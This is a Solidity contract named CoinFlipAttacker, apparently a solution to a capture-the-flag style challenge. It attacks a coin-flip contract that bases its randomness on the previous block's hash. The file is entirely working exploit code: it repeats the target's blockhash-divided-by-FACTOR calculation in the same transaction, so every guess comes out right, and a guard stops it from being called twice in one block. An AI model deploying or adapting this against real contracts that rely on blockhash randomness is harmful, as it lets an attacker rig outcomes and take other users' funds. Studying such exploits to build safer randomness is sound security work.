// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public coinFlip;

    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlip) {
        coinFlip = ICoinFlip(_coinFlip);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 value = blockValue / FACTOR;
        bool side = value == 1 ? true : false;

        coinFlip.flip(side);
    }
}